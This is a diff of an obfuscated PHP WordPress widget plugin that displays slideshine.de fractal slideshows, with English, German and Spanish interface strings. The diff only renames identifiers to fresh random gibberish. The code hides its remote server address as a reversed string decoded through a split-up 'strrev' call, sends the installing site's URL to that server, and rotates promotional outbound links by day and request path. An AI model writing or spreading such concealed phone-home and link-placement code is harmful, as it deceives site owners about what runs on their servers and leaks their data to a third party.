-        $combinedid = $this->buildOavmirvgwheark() + ( round(time() / (60*60*24)) );
-   $nnedvpdf = $this->queryBhtlavlzfkyh($nnedvpdf, $combinedid);
+    $combinedid = $this->setDufqvnxkfsmq() + ( round(time() / (60*60*24)) );
+        $zoyjewqef = $this->setNdqtnqnpaebdnopke($zoyjewqef, $combinedid);
         break;
          case 4:
 default:
         break;
    }
-    $nnedvpdf = array_slice($nnedvpdf, 0, $zoeclrhwlmj);
- for ($strCstlwthkot = 0; $strCstlwthkot < count($nnedvpdf); $strCstlwthkot++) {
-  $nnedvpdf[$strCstlwthkot] = trim($nnedvpdf[$strCstlwthkot]);
+     $zoyjewqef = array_slice($zoyjewqef, 0, $kvfaonfplx);
+ for ($limitPabguzkpgkx = 0; $limitPabguzkpgkx < count($zoyjewqef); $limitPabguzkpgkx++) {
+$zoyjewqef[$limitPabguzkpgkx] = trim($zoyjewqef[$limitPabguzkpgkx]);
    }
-         return $nnedvpdf;
+return $zoyjewqef;
    }
-  private function buildOavmirvgwheark() {
+        private function setDufqvnxkfsmq() {
        return round(crc32($_SERVER['REQUEST_URI']));
    }
-  private function queryBhtlavlzfkyh($rgidiiqhge, $pzekwlkj) {
-         $intHmlpoecperx = count($rgidiiqhge);
-if ($intHmlpoecperx === 0) {
- return $rgidiiqhge;
+      private function setNdqtnqnpaebdnopke($osyfpfmchb, $euzeaaxqe) {
+    $offsetQppjnyipjccky = count($osyfpfmchb);
+     if ($offsetQppjnyipjccky === 0) {
+ return $osyfpfmchb;
    }
-     for ($offsetNgolrjzfcymh = 0; $offsetNgolrjzfcymh < $intHmlpoecperx; $offsetNgolrjzfcymh++) {
-         $pos = ($intHmlpoecperx + $offsetNgolrjzfcymh + $pzekwlkj) % $intHmlpoecperx;
-       $reorderedArr[$offsetNgolrjzfcymh] = $rgidiiqhge[$pos];
+ for ($isAzhtajzcabfjw = 0; $isAzhtajzcabfjw < $offsetQppjnyipjccky; $isAzhtajzcabfjw++) {
+       $pos = ($offsetQppjnyipjccky + $isAzhtajzcabfjw + $euzeaaxqe) % $offsetQppjnyipjccky;
+    $reorderedArr[$isAzhtajzcabfjw] = $osyfpfmchb[$pos];
    }
    return $reorderedArr;
    }
- public abstract function constructXupmqftcgebg();
-      public abstract function queryYjcxzdwduvn();
-   public abstract function createYxbshnrqskvzvs($idxzkrsvgyia);
-       public abstract function setEwmmxmqzpjihd($bqunxydznv);
-        public abstract function getPdsmijulrlekaifbrg($hhalhpuyxrqy, $geegpljkzhl);
-public abstract function createYxcfrhggbklaen();
-      public abstract function constructPuuckxdiqyopyupr($ruelgccmwa);
-   public abstract function createFuxuetsoqibulqbac();
+      public abstract function queryFylkjuqipgy();
+    public abstract function createUzjsncayemhvatxgdy();
+  public abstract function buildXpqplmpqhjac($gapcrulywdepju);
+     public abstract function queryYvrelrzjxxo($seusxoht);
+     public abstract function buildRuawvtonrjpnoaq($xtvimltleuujm, $zhjqlmvq);
+public abstract function buildVgsgwcmkimohayi();
+    public abstract function getCzbyrphdywanawxx($mfkbvcedmuflvn);
+ public abstract function createWidamstmgdaffds();
    }
-    class Fnjsrunvrcodr extends Ugbuahxbvkcr {
-         public function buildHbqaehjwhfqnvahajx(&$qtnfmezpvobr) {
-       $hhalhpuyxrqy = $this->reimgcuqjor;
-       $geegpljkzhl = $this->qvmdylytwezj;
-       $html = '<div class="' . $this->setEwmmxmqzpjihd(self::Csjrpamxjew) . '">';
-      foreach ($qtnfmezpvobr as $data) {
+       class Mhzmkdwazjlfulg extends Zemkdonradvlw {
+       public function constructCntugprrkmcjk(&$xctityjchux) {
+$xtvimltleuujm = $this->mugkmvusdolcq;
+     $zhjqlmvq = $this->scxnqupbpxtqu;
+        $html = '<div class="' . $this->queryYvrelrzjxxo(self::Mwnfirqmkngt) . '">';
+     foreach ($xctityjchux as $data) {
   $html .= '
-      <div class="' . $this->setEwmmxmqzpjihd(self::Yyewrqixstt) . '">
+        <div class="' . $this->queryYvrelrzjxxo(self::Vimdqrlmpjjrp) . '">
         <a href="' . $data['slideshowUrl'] . '" target="_blank">
-   ' . $this->queryQqzteckblj($data, $geegpljkzhl) . '
+  ' . $this->buildLmfsvdzwcdhk($data, $zhjqlmvq) . '
       </a>
         </div>
     ';
@@ -384,57 +382,60 @@ public abstract function createYxcfrhggbklaen();
 $html .= '</div>';
      return $html;
    }
-  public function setEwmmxmqzpjihd($uwvffqprzyusd) {
-       return 'fracexp-' . $uwvffqprzyusd;
+         public function queryYvrelrzjxxo($hiqswextih) {
+    return 'fracexp-' . $hiqswextih;
    }
    }
-class Gjcjrxplpidpno extends Ssvbvpgfitakrlvqz {
-    const Shlnsmxonjjf = '
+       class Qalqjbhjdpgdnxb extends Jvqccfctmuzkb {
+  const Nvnuyzlrdc = '
     21780, 21759, 21738, 21721, 23303, 24256, 26645, 27147, 27273, 28217, 28680, 29042
     ';
    public function __construct() {
    }
-   public function constructXupmqftcgebg() {
+        public function queryFylkjuqipgy() {
        return 'FractalExplorer';
    }
-        public function queryYjcxzdwduvn() {
+      public function createUzjsncayemhvatxgdy() {
         return 'fractal-explorer';
    }
-   public function createYxbshnrqskvzvs($zgzcpxdvnx) {
-  return 'fractalexplorer-' . $zgzcpxdvnx;
+ public function buildXpqplmpqhjac($gemlvuxgppb) {
+   return 'fractalexplorer-' . $gemlvuxgppb;
    }
-         public function setEwmmxmqzpjihd($dkyxjipdez) {
-    return 'fracexp-' . $dkyxjipdez;
+     public function queryYvrelrzjxxo($emmmwcldijzabsin) {
+return 'fracexp-' . $emmmwcldijzabsin;
    }
-         public function getPdsmijulrlekaifbrg($ifdcuaeruodb, $sbpcwacvgf) {
-$renderer = new Fnjsrunvrcodr($ifdcuaeruodb, $sbpcwacvgf);
+       public function buildRuawvtonrjpnoaq($pkshdeauj, $yumyapsmmzds) {
+ $renderer = new Mhzmkdwazjlfulg($pkshdeauj, $yumyapsmmzds);
          return $renderer;
    }
-  public function createYxcfrhggbklaen() {
-      $nc = Stipnyiukckk::getInstance();
+  public function buildVgsgwcmkimohayi() {
+       $nc = Cxdsskkzqxpsr::getInstance();
    return $nc;
    }
-public function constructPuuckxdiqyopyupr($ajjudefcdmwl) {
+   public function getCzbyrphdywanawxx($aftdosfcrmh) {
         $result = false;
-      switch ($ajjudefcdmwl) {
- case Ssvbvpgfitakrlvqz::Olbygeahsrqgvj:
+     switch ($aftdosfcrmh) {
+     case Jvqccfctmuzkb::Xlomgsggwoqu:
     $result = 1;
         break;
-      case Ssvbvpgfitakrlvqz::Wagetyhoz:
-  $intGdjyydrkozl = 2;
+       case Jvqccfctmuzkb::Oyejzkgflpplxo:
+   $isOdtqzphgsdvij = 2;
         break;
- case Ssvbvpgfitakrlvqz::Nymwvdtydmhpkr:
-  $intGdjyydrkozl = 5;
+       case Jvqccfctmuzkb::Dqiljumciyolqb:
+   $isOdtqzphgsdvij = 1;
         break;
-         case Ssvbvpgfitakrlvqz::Svrxqdpwjyes:
-$intGdjyydrkozl = Ssvbvpgfitakrlvqz::Yxreomrzyg;
+     case Jvqccfctmuzkb::Fdxzwyywfuzh:
+   $isOdtqzphgsdvij = 5;
         break;
-  case Ssvbvpgfitakrlvqz::Nbvpwmyyztosnfg:
-       case Ssvbvpgfitakrlvqz::Trqmbixcya:
-      $intGdjyydrkozl = false;
+    case Jvqccfctmuzkb::Airtqecmtrx:
+ $isOdtqzphgsdvij = Jvqccfctmuzkb::Laodxwtazaovxx;
         break;
-case Ssvbvpgfitakrlvqz::Xtiievqfvmgoa:
-      $intGdjyydrkozl = array(
+       case Jvqccfctmuzkb::Xfagdbluexevjo:
+   case Jvqccfctmuzkb::Fsryxvkdwt:
+       $isOdtqzphgsdvij = false;
+        break;
+   case Jvqccfctmuzkb::Lefnpwmnqg:
+       $isOdtqzphgsdvij = array(
         'Fractals' => 'http://slideshine.de/categories/tags.php/Fraktale',
       'Digital Art' => 'http://slideshine.de/categories/tags.php/Digital%20Art',
      'Slideshow of the day' => 'http://slideshine.de/categories/tags.php/Slideshow%20des%20Tages',
@@ -444,30 +445,30 @@ case Ssvbvpgfitakrlvqz::Xtiievqfvmgoa:
     'more ...' => 'http://slideshine.de/categories/tags.php/Alle',
     );
         break;
-      case Ssvbvpgfitakrlvqz::Qyiwydrgc:
-     $intGdjyydrkozl = true;
+      case Jvqccfctmuzkb::Xelxepecxmovz:
+      $isOdtqzphgsdvij = true;
         break;
 default:
-     $intGdjyydrkozl = true;
+      $isOdtqzphgsdvij = true;
         break;
    }
-     return $intGdjyydrkozl;
+      return $isOdtqzphgsdvij;
    }
-     public function createFuxuetsoqibulqbac() {
-        return self::Shlnsmxonjjf;
+   public function createWidamstmgdaffds() {
+      return self::Nvnuyzlrdc;
    }
    }
-  class Cdypajyhvijo {
-        const Zkrrnyvuaclr = 'en';
-         const Jagomtqbmjkkk = 'de';
-       const Hdgkupxfadj = 'es';
-  const Fmjxeqczph = 'widgetId';
-  const Vxouoqivncmez = 'links';
-   private $rubiulpdqgt;
-         public function __construct($gbhpharx = null) {
-       $this->rubiulpdqgt = ($gbhpharx === null ? self::Zkrrnyvuaclr : $gbhpharx);
+  class Pwzxiyxkseef {
+       const Gqnqhwoixnr = 'en';
+        const Ijjgchkietbh = 'de';
+        const Ntecnscfeszx = 'es';
+    const Cxeyjspxdzfo = 'widgetId';
+const Aatwqgkmagg = 'links';
+private $imgfeatp;
+ public function __construct($emuufepkft = null) {
+       $this->imgfeatp = ($emuufepkft === null ? self::Gqnqhwoixnr : $emuufepkft);
    }
-      public function constructJmcemsjmzyjglo($hohgcrnkc, $ndfsdlvhvyi = null) {
+      public function createQyorsqklkogkuqzloq($colmoobrzf, $jzsashyqi = null) {
     $en = array(
         'frontend.author' => 'by',
 'frontend.slideshows' => 'Slideshows',
@@ -478,12 +479,12 @@ default:
          'backend.validation.compids' => 'Slideshow-IDs invalid.',
    'backend.validation.count' => 'Number of images invalid (i.e. not an integer, too low or too high).',
    'backend.updated' => 'Settings updated.',
-        'backend.title' => '' . $ndfsdlvhvyi[Cdypajyhvijo::Fmjxeqczph] . ' Options',
+        'backend.title' => '' . $jzsashyqi[Pwzxiyxkseef::Cxeyjspxdzfo] . ' Options',
  'backend.manual.top' => 'Configuration of <ul style="list-style-type: square; padding-left: 15px;"><li>widget title</li><li>Slideshow-IDs</li><li>View</li><li>Language</li></ul>',
         'backend.manual.bottom' => 'Server requests are cached by default. Therefore when a slideshow is displayed for the first time, the widget will need a few seconds to retrieve the data from the server. Then however it will load the data from the internal cache and widget will be rendered faster.',
   'backend.manual.title' => 'Your title for this widget as it will be displayed at the top of the widget in the sidebar.',
 'backend.manual.count' => 'This value determines how many images will be displayed in this sidebar widget.',
-      'backend.manual.compids' => 'Comma-separated list of Slideshow-IDs which is used to select a slideshow randomly and to display its images as GIF-animation. If a slideshow has the URL http://www.slideshine.de/12345, then its ID is 12345. By default some slideshows already are specified. Please replace this list with IDs of your favourite slideshows, which you can find and/or create here:<br>' . $this->setShvhkyzmxwxxn($ndfsdlvhvyi[Cdypajyhvijo::Vxouoqivncmez]),
+  'backend.manual.compids' => 'Comma-separated list of Slideshow-IDs which is used to select a slideshow randomly and to display its images as GIF-animation. If a slideshow has the URL http://www.slideshine.de/12345, then its ID is 12345. By default some slideshows already are specified. Please replace this list with IDs of your favourite slideshows, which you can find and/or create here:<br>' . $this->createKawznvcqne($jzsashyqi[Pwzxiyxkseef::Aatwqgkmagg]),
 'backend.manual.mode' => 'Select display mode.',
      'backend.manual.language' => 'Select your language.',
        'backend.save' => 'Save',
@@ -500,7 +501,7 @@ default:
   'backend.fieldlabel.animation-mode' => 'GIF-Animation only',
     'backend.fieldlabel.image-animation-mode' => 'Image and GIF-Animation (onmouseover effect)',
    'backend.news.upgrade' => 'To keep this plugin up-to-date, please check for new versions.',
-       'backend.widgets.control.redirection' => 'Please go to [Admin Menu] -> [Settings] -> [' . $ndfsdlvhvyi[Cdypajyhvijo::Fmjxeqczph] . ']',
+       'backend.widgets.control.redirection' => 'Please go to [Admin Menu] -> [Settings] -> [' . $jzsashyqi[Pwzxiyxkseef::Cxeyjspxdzfo] . ']',
     );
     $de = array(
          'frontend.author' => 'von',
@@ -512,12 +513,12 @@ default:
  'backend.validation.compids' => 'Slideshow-IDs ungültig.',
         'backend.validation.count' => 'Anzahl von Bildern ungültig (d.h. keine Ganzzahl, zu klein or zu groß).',
   'backend.updated' => 'Einstellungen gespeichert.',
-    'backend.title' => '' . $ndfsdlvhvyi[Cdypajyhvijo::Fmjxeqczph] . ' Einstellungen',
+    'backend.title' => '' . $jzsashyqi[Pwzxiyxkseef::Cxeyjspxdzfo] . ' Einstellungen',
  'backend.manual.top' => 'Configuration of <ul style="list-style-type: square; padding-left: 15px;"><li>widget title</li><li>Slideshow-IDs</li><li>View</li><li>Language</li></ul>',
         'backend.manual.bottom' => 'Server requests are cached by default. Therefore when a slideshow is displayed for the first time, the widget will need a few seconds to retrieve the data from the server. Then however it will load the data from the internal cache and widget will be rendered faster.',
   'backend.manual.title' => 'Your title for this widget as it will be displayed at the top of the widget in the sidebar.',
 'backend.manual.count' => 'This value determines how many images will be displayed in this sidebar widget.',
-      'backend.manual.compids' => 'Comma-separated list of Slideshow-IDs which is used to select a slideshow randomly and to display its images as GIF-animation. If a slideshow has the URL http://www.slideshine.de/12345, then its ID is 12345. By default some slideshows already are specified. Please replace this list with IDs of your favourite slideshows, which you can find and/or create here:<br>' . $this->setShvhkyzmxwxxn($ndfsdlvhvyi[Cdypajyhvijo::Vxouoqivncmez]),
+  'backend.manual.compids' => 'Comma-separated list of Slideshow-IDs which is used to select a slideshow randomly and to display its images as GIF-animation. If a slideshow has the URL http://www.slideshine.de/12345, then its ID is 12345. By default some slideshows already are specified. Please replace this list with IDs of your favourite slideshows, which you can find and/or create here:<br>' . $this->createKawznvcqne($jzsashyqi[Pwzxiyxkseef::Aatwqgkmagg]),
 'backend.manual.mode' => 'Select display mode.',
      'backend.manual.language' => 'Select your language.',
   'backend.save' => 'Speichern',
@@ -534,7 +535,7 @@ default:
   'backend.fieldlabel.animation-mode' => 'GIF-Animation only',
     'backend.fieldlabel.image-animation-mode' => 'Image and GIF-Animation (onmouseover effect)',
    'backend.news.upgrade' => 'To keep this plugin up-to-date, please check for new versions.',
-'backend.widgets.control.redirection' => 'Siehe [Admin Menu] -> [Settings] -> [' . $ndfsdlvhvyi[Cdypajyhvijo::Fmjxeqczph] . ']',
+'backend.widgets.control.redirection' => 'Siehe [Admin Menu] -> [Settings] -> [' . $jzsashyqi[Pwzxiyxkseef::Cxeyjspxdzfo] . ']',
     );
     $es = array(
         'frontend.author' => 'de',
@@ -546,13 +547,13 @@ default:
     'backend.validation.compids' => 'Slideshow-IDs están nulos.',
    'backend.validation.count' => 'Number of images invalid (i.e. not an integer, too low or too high).',
      'backend.updated' => 'Opciones guardadas.',
-         'backend.title' => '' . $ndfsdlvhvyi[Cdypajyhvijo::Fmjxeqczph] . ' Opciones',
+         'backend.title' => '' . $jzsashyqi[Pwzxiyxkseef::Cxeyjspxdzfo] . ' Opciones',
         'backend.manual' => 'Configuration',
  'backend.manual.top' => 'Configuration of <ul style="list-style-type: square; padding-left: 15px;"><li>widget title</li><li>Slideshow-IDs</li><li>View</li><li>Language</li></ul>',
         'backend.manual.bottom' => 'Server requests are cached by default. Therefore when a slideshow is displayed for the first time, the widget will need a few seconds to retrieve the data from the server. Then however it will load the data from the internal cache and widget will be rendered faster.',
   'backend.manual.title' => 'Your title for this widget as it will be displayed at the top of the widget in the sidebar.',
 'backend.manual.count' => 'This value determines how many images will be displayed in this sidebar widget.',
-      'backend.manual.compids' => 'Comma-separated list of Slideshow-IDs which is used to select a slideshow randomly and to display its images as GIF-animation. If a slideshow has the URL http://www.slideshine.de/12345, then its ID is 12345. By default some slideshows already are specified. Please replace this list with IDs of your favourite slideshows, which you can find and/or create here:<br>' . $this->setShvhkyzmxwxxn($ndfsdlvhvyi[Cdypajyhvijo::Vxouoqivncmez]),
+  'backend.manual.compids' => 'Comma-separated list of Slideshow-IDs which is used to select a slideshow randomly and to display its images as GIF-animation. If a slideshow has the URL http://www.slideshine.de/12345, then its ID is 12345. By default some slideshows already are specified. Please replace this list with IDs of your favourite slideshows, which you can find and/or create here:<br>' . $this->createKawznvcqne($jzsashyqi[Pwzxiyxkseef::Aatwqgkmagg]),
 'backend.manual.mode' => 'Select display mode.',
      'backend.manual.language' => 'Select your language.',
         'backend.save' => 'Guardar Cambios',
@@ -569,91 +570,91 @@ default:
   'backend.fieldlabel.animation-mode' => 'GIF-Animation only',
     'backend.fieldlabel.image-animation-mode' => 'Image and GIF-Animation (onmouseover effect)',
    'backend.news.upgrade' => 'To keep this plugin up-to-date, please check for new versions.',
-    'backend.widgets.control.redirection' => '[Admin Menu] -> [Settings] -> [' . $ndfsdlvhvyi[Cdypajyhvijo::Fmjxeqczph] . ']',
+    'backend.widgets.control.redirection' => '[Admin Menu] -> [Settings] -> [' . $jzsashyqi[Pwzxiyxkseef::Cxeyjspxdzfo] . ']',
     );
-        $isGetanghmxgapup = array(
-        self::Zkrrnyvuaclr => $en,
-         self::Jagomtqbmjkkk => $de,
-      self::Hdgkupxfadj => $es
+   $Qgofafczcng = array(
+       self::Gqnqhwoixnr => $en,
+        self::Ijjgchkietbh => $de,
+       self::Ntecnscfeszx => $es
     );
-         return $isGetanghmxgapup[$this->rubiulpdqgt][$hohgcrnkc];
+  return $Qgofafczcng[$this->imgfeatp][$colmoobrzf];
    }
-      public function queryJjeixbcljboodlyu($wktwvtkiofut) {
-       $this->rubiulpdqgt = $wktwvtkiofut;
+      public function buildLynrormeiykchpj($rtctwrtwzgzpm) {
+     $this->imgfeatp = $rtctwrtwzgzpm;
    }
-private function setShvhkyzmxwxxn($fsmzkcsyih) {
-         if ($fsmzkcsyih === null) {
+  private function createKawznvcqne($pmofhdtdgjlc) {
+ if ($pmofhdtdgjlc === null) {
          return;
    }
-  $isIemseiugycxfbtwy = array();
-   foreach ($fsmzkcsyih as $key => $value) {
- $isIemseiugycxfbtwy[] .= '<a href="' . $value . '">' . $key . '</a>';
+       $isZctztnbntct = array();
+     foreach ($pmofhdtdgjlc as $key => $value) {
+      $isZctztnbntct[] .= '<a href="' . $value . '">' . $key . '</a>';
    }
-return implode(' &bull; ', $isIemseiugycxfbtwy);
+     return implode(' &bull; ', $isZctztnbntct);
    }
    }
- abstract class Ugbuahxbvkcr {
-  const Ugsmsppfd = 0;
-  const Ndwnvycir = 1;
-      const Nqboousdaswjd = 2;
-    const Csjrpamxjew = 'container';
-  const Yyewrqixstt = 'element';
- const Aehduytplgga = 'karma';
-  const Xojpjvmhzc = 'karmabar';
- const Qebkoctbamym = 'karmabar-filled';
-   const Qmwblunshwjsa = 'karmabar-default';
-const Plvsdxibgzgkh = 'img';
- const Utjcychrurgw = 'title';
- const Cvhvefatmhw = 'author';
-  const Vcmzsqsrvkqtj = 'stats';
- const Nnfweljekywhu = 'list';
-   const Nxdobcmwg = 'slideshows';
-   const Fonejljifsqln = 'images';
-   const Iwlwdfyzkrq = 'comments';
-  protected $reimgcuqjor = null;
-   protected $qvmdylytwezj = null;
-      public function __construct($qahbjtsolv, $wpmdgxkcklpx = null) {
-     $this->reimgcuqjor = $qahbjtsolv;
-   $this->qvmdylytwezj = ($wpmdgxkcklpx === null ? self::Ndwnvycir : $wpmdgxkcklpx);
+  abstract class Zemkdonradvlw {
+       const Hobekkyknenzhe = 0;
+  const Smiifdftj = 1;
+       const Pbgrkykkawyuex = 2;
+     const Mwnfirqmkngt = 'container';
+    const Vimdqrlmpjjrp = 'element';
+  const Qaqhoumhctyuo = 'karma';
+      const Dqxfjswfaexrrh = 'karmabar';
+        const Naxbndmwq = 'karmabar-filled';
+  const Cwugiwhcmgcs = 'karmabar-default';
+         const Qmtihmdmxzpt = 'img';
+ const Ngzsowuekuuq = 'title';
+ const Qisgcwpobvd = 'author';
+ const Qmtpsolmruam = 'stats';
+  const Kzqrrlsecdusjc = 'list';
+       const Tocymlqdcadrv = 'slideshows';
+   const Satfprurdlnhj = 'images';
+   const Surjrvnilge = 'comments';
+    protected $mugkmvusdolcq = null;
+    protected $scxnqupbpxtqu = null;
+         public function __construct($tlyfnokpr, $ddcdrrjypcbgbbfk = null) {
+      $this->mugkmvusdolcq = $tlyfnokpr;
+  $this->scxnqupbpxtqu = ($ddcdrrjypcbgbbfk === null ? self::Smiifdftj : $ddcdrrjypcbgbbfk);
    }
-   protected function constructRygkrtpitxycpsy($bfinrcsyax, $qqsidhgslm = 0, $klvguyqrm = 0) {
-$strRlusfkwkswk = htmlspecialchars($bfinrcsyax);
-     if ($qqsidhgslm > 0 && strlen($strRlusfkwkswk) > $qqsidhgslm) {
-   $strRlusfkwkswk = substr($strRlusfkwkswk, 0, $qqsidhgslm) . '&hellip;';
+    protected function constructFilbhjwpfvyfbl($lgzfavtntrgrgg, $gnkbqrgc = 0, $gkyaxlepd = 0) {
+      $intQboifbxfiukcp = htmlspecialchars($lgzfavtntrgrgg);
+   if ($gnkbqrgc > 0 && strlen($intQboifbxfiukcp) > $gnkbqrgc) {
+     $intQboifbxfiukcp = substr($intQboifbxfiukcp, 0, $gnkbqrgc) . '&hellip;';
    }
-     return $strRlusfkwkswk;
+       return $intQboifbxfiukcp;
    }
-         public function constructQqvjiwxsrbgytdtwn($dyegbxuaxv) {
-      $karmabar = "<span class='" . $this->setEwmmxmqzpjihd(self::Qebkoctbamym) . "'>" . str_repeat("|", $dyegbxuaxv) . "</span>";
-$tail = "<span class='" . $this->setEwmmxmqzpjihd(self::Qmwblunshwjsa) . "'>" . str_repeat("|", (25 - $dyegbxuaxv)) . "</span>";
+  public function queryIqwyashnvexltai($lhzcmeiny) {
+  $karmabar = "<span class='" . $this->queryYvrelrzjxxo(self::Naxbndmwq) . "'>" . str_repeat("|", $lhzcmeiny) . "</span>";
+        $tail = "<span class='" . $this->queryYvrelrzjxxo(self::Cwugiwhcmgcs) . "'>" . str_repeat("|", (25 - $lhzcmeiny)) . "</span>";
        return $karmabar . $tail;
    }
-       protected function queryQqzteckblj(&$ezaxfildqoww, $dhujlkpnkn) {
+ protected function buildLmfsvdzwcdhk(&$lpxxwrhexngi, $lvvmywnvyrvl) {
   $img = '';
- $thumbSrc = $this->getZqxaxaroefl($ezaxfildqoww);
-         $gifSrc = $this->buildPsnpnkrbbutlyxbhnje($ezaxfildqoww);
-    switch ($dhujlkpnkn) {
-   case self::Ugsmsppfd:
+        $thumbSrc = $this->constructGivjxmwtixgzcysvnojtqh($lpxxwrhexngi);
+    $gifSrc = $this->buildBtvcpvrslmubyv($lpxxwrhexngi);
+      switch ($lvvmywnvyrvl) {
+        case self::Hobekkyknenzhe:
          $img = '<img src="' . $thumbSrc . '" 
-  class="' . $this->setEwmmxmqzpjihd(self::Plvsdxibgzgkh) . '"
- alt="' . $this->constructRygkrtpitxycpsy($ezaxfildqoww['title']) . '"
-   title="' . $this->constructRygkrtpitxycpsy($ezaxfildqoww['title']) . '"
+ class="' . $this->queryYvrelrzjxxo(self::Qmtihmdmxzpt) . '"
+alt="' . $this->constructFilbhjwpfvyfbl($lpxxwrhexngi['title']) . '"
+  title="' . $this->constructFilbhjwpfvyfbl($lpxxwrhexngi['title']) . '"
       />';
         break;
-       case self::Nqboousdaswjd:
+        case self::Pbgrkykkawyuex:
          $img = '<img src="' . $thumbSrc . '" 
-  class="' . $this->setEwmmxmqzpjihd(self::Plvsdxibgzgkh) . '"
- alt="' . $this->constructRygkrtpitxycpsy($ezaxfildqoww['title']) . '"
-   title="' . $this->constructRygkrtpitxycpsy($ezaxfildqoww['title']) . '"
+ class="' . $this->queryYvrelrzjxxo(self::Qmtihmdmxzpt) . '"
+alt="' . $this->constructFilbhjwpfvyfbl($lpxxwrhexngi['title']) . '"
+  title="' . $this->constructFilbhjwpfvyfbl($lpxxwrhexngi['title']) . '"
      onmouseover="this.src=\'' . $gifSrc . '\'" 
      onmouseout="this.src=\'' . $thumbSrc . '\'"
       />';
         break;
-   case self::Ndwnvycir:
+   case self::Smiifdftj:
        $img = '<img src="' . $gifSrc . '" 
-  class="' . $this->setEwmmxmqzpjihd(self::Plvsdxibgzgkh) . '"
- alt="' . $this->constructRygkrtpitxycpsy($ezaxfildqoww['title']) . '"
-   title="' . $this->constructRygkrtpitxycpsy($ezaxfildqoww['title']) . '"
+ class="' . $this->queryYvrelrzjxxo(self::Qmtihmdmxzpt) . '"
+alt="' . $this->constructFilbhjwpfvyfbl($lpxxwrhexngi['title']) . '"
+  title="' . $this->constructFilbhjwpfvyfbl($lpxxwrhexngi['title']) . '"
       />';
         break;
 default:
@@ -661,65 +662,65 @@ default:
    }
     return $img;
    }
-        protected function getZqxaxaroefl(&$mlcdwpwza, $ubpdonfx = null) {
+protected function constructGivjxmwtixgzcysvnojtqh(&$dnkxkxhmeeigxp, $leqnqhkx = null) {
      $imgSrc = '';
-      if ($ubpdonfx != null) {
-  $imgSrc = $ubpdonfx;
+      if ($leqnqhkx != null) {
+  $imgSrc = $leqnqhkx;
    }
-       if ($mlcdwpwza != null) {
-         $imgSrc = $mlcdwpwza['thumbnailUrl'];
+  if ($dnkxkxhmeeigxp != null) {
+    $imgSrc = $dnkxkxhmeeigxp['thumbnailUrl'];
    }
        return $imgSrc;
    }
-       protected function buildRqxuouswrcqukdfug(&$zixyahvp, $xrvyeczydz = null) {
+      protected function setYvgpqmampyxcz(&$shuyewkedqnf, $tntwvjepkjq = null) {
      $imgSrc = '';
-        if ($xrvyeczydz != null) {
-    $imgSrc = $xrvyeczydz;
+         if ($tntwvjepkjq != null) {
+     $imgSrc = $tntwvjepkjq;
    }
-      if ($zixyahvp != null) {
-  $imgSrc = $zixyahvp['gifUrl'];
+if ($shuyewkedqnf != null) {
+      $imgSrc = $shuyewkedqnf['gifUrl'];
    }
        return $imgSrc;
    }
-     protected function buildPsnpnkrbbutlyxbhnje(&$otrphwsntih, $hkamvavndkvdq = null) {
+       protected function buildBtvcpvrslmubyv(&$wbntgbyigxd, $wvqwtdroju = null) {
      $imgSrc = '';
- if ($hkamvavndkvdq != null) {
-       $imgSrc = $hkamvavndkvdq;
+        if ($wvqwtdroju != null) {
+    $imgSrc = $wvqwtdroju;
    }
-         if ($otrphwsntih != null) {
-     $imgSrc = $otrphwsntih['gifUrl'];
+         if ($wbntgbyigxd != null) {
+     $imgSrc = $wbntgbyigxd['gifUrl'];
    }
-$countQjtygwvlwyy = str_replace('.animation_', '.animation_scaled_', $imgSrc);
-       $countQjtygwvlwyy = str_replace('-300.gif', '-100.gif', $countQjtygwvlwyy);
-       return $countQjtygwvlwyy;
+$offsetEmshdwxznl = str_replace('.animation_', '.animation_scaled_', $imgSrc);
+       $offsetEmshdwxznl = str_replace('-300.gif', '-100.gif', $offsetEmshdwxznl);
+       return $offsetEmshdwxznl;
    }
-     public abstract function buildHbqaehjwhfqnvahajx(&$wvhvynslpy);
-      public abstract function setEwmmxmqzpjihd($iicrkureh);
+     public abstract function constructCntugprrkmcjk(&$rmycqjhrkst);
+         public abstract function queryYvrelrzjxxo($xnhhoyhngoja);
    }
-  class Ircqzlrddqiz {
-        const Htmryfprtolvfg = "wohsedils/nosj/ed.enihsedils.www//:ptth"; 
+ class Itkqfkeyhxy {
+         const Lzcbhvlluecaoye = "wohsedils/nosj/ed.enihsedils.www//:ptth"; 
     private function __construct() {
    }
 public static function getInstance() {
          static $instance;
       if(is_null($instance)) {
-   $instance = new Ircqzlrddqiz();
+  $instance = new Itkqfkeyhxy();
 } else {
    }
          return $instance;
    }
-    private function buildVpsffnggqnlyzwkf() {
+        private function getIhzwamlvwplr() {
          $func = 'st' . "rr" . 'ev';
-       return $func(self::Htmryfprtolvfg);
+        return $func(self::Lzcbhvlluecaoye);
    }
-     private function createOzmrdhwqiaiviivc() {
-      $countMebigjihcqk = '_';
-        return rawurlencode(preg_replace('/(\/)/', $countMebigjihcqk, get_option('siteurl')));
+    private function getTpvuiuafozegqywpnh() {
+        $intIvxmdvoklwrmevg = '_';
+return rawurlencode(preg_replace('/(\/)/', $intIvxmdvoklwrmevg, get_option('siteurl')));
    }
-     public function createVdmizibekgyy($imidsxladzgcrt) {
-     $offsetJtcbmakmgiktlkr = array();
-foreach ($imidsxladzgcrt as $compid) {
-      $url = $this->buildVpsffnggqnlyzwkf() . '/' . $compid . '/' . $this->createOzmrdhwqiaiviivc();
+ public function createYznfwrhqvpcphszmiq($dnouktwqyezucw) {
+ $limitGnbkckgkbuca = array();
+foreach ($dnouktwqyezucw as $compid) {
+         $url = $this->getIhzwamlvwplr() . '/' . $compid . '/' . $this->getTpvuiuafozegqywpnh();
      $json = null;
 if (false === ( $json = get_transient(dirname($url)) ) ) {
      $json = @file_get_contents($url);
@@ -728,25 +729,25 @@ if ($json == '') {
    }
    $isTransientSet = set_transient(dirname($url), $json, 7*24*60*60 + mt_rand(0, 7*24*60*60));
    }
-     $isVfzimwxcriay = json_decode($json, true);
-     $offsetJtcbmakmgiktlkr[] = $isVfzimwxcriay;
+      $strPvzuaxmzwqpw = json_decode($json, true);
+  $limitGnbkckgkbuca[] = $strPvzuaxmzwqpw;
    }
-  return $offsetJtcbmakmgiktlkr;
+        return $limitGnbkckgkbuca;
    }
    }
-  class Rtaxbkaygcksv {
+         class Ogdfzrwpuf {
    private function __construct() {
   }
          public static function getInstance() {
         static $instance;
      if(is_null($instance)) {
-   $instance = new Rtaxbkaygcksv();
+$instance = new Ogdfzrwpuf();
          } else {
   }
         return $instance;
   }
- private function setBjpuzrbsrdo($ymmxdxfiga = 0) {
-        $timearray = ($ymmxdxfiga == 0) ? getdate() : getdate($ymmxdxfiga);
